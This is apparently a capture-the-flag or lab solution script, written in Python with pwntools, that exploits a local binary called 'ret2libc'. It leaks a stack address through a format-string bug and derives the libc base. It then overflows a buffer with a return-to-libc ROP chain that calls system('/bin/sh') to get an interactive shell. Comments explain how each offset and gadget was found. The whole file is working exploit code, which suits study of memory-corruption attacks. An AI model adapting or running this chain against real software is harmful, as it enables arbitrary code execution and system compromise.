#!/usr/bin/env python3
from pwn import *

# Create the process
p = process("./ret2libc", stdin=PTY)
# gdb.attach(p, "b *main+110\nc")
p.recvline() # Ignore the first line

# Leak an address from the stack
p.sendline("%5$p")
leaked_addr = int(p.recvline(), 16)
print("Leaked address: " + hex(leaked_addr))

# Calculate the address of libc from the leaked address
# The offset was found by doing the following:
# 1.) Leak the fourth address from the stack within GDB.
# 2.) In the same GDB instance, use "vmmap" to find the base of libc.
# 3.) Subtract the two addresses to get the offset.
libc_addr = leaked_addr - 0x1bebe0
print("Libc: " + hex(libc_addr))

# Calculate the offset of system()
# Offset was found using "readelf -s /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep system"
system_addr = p64(libc_addr + 0x48df0)
print("system(): " + hex(libc_addr + 0x48df0))

# Calculate the offset of /bin/sh
# The offset was found by doing the following:
# 1.) Use info proc map to print out the loaded addresses of libc.
# 2.) Use find 0x7ffff7def000,0x7ffff7fb0000,"/bin/sh" to find the string.
# 3.) Subtract the base of libc from the address of the string to obtain the offset.
bin_sh_addr = p64(libc_addr + 0x18a156)
print("/bin/sh: " + hex(libc_addr + 0x18a156))

# Calculate the offset of exit()
# Offset was found using "readelf -s /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep exit"
exit_addr = p64(libc_addr + 0x3e600)
print("exit(): " + hex(libc_addr + 0x3e600))

# POP RDI ROP gadget
# Found using ropper --file /usr/lib/x86_64-linux-gnu/libc-2.31.so --search "pop rdi"
pop_rdi_addr = p64(libc_addr + 0x26796)
print("POP RDI: " + hex(libc_addr + 0x26796))

# Trigger the buffer overflow
payload = b'A' * 120
payload += pop_rdi_addr
payload += bin_sh_addr
payload += system_addr
payload += exit_addr
p.sendline(payload)
p.interactive()
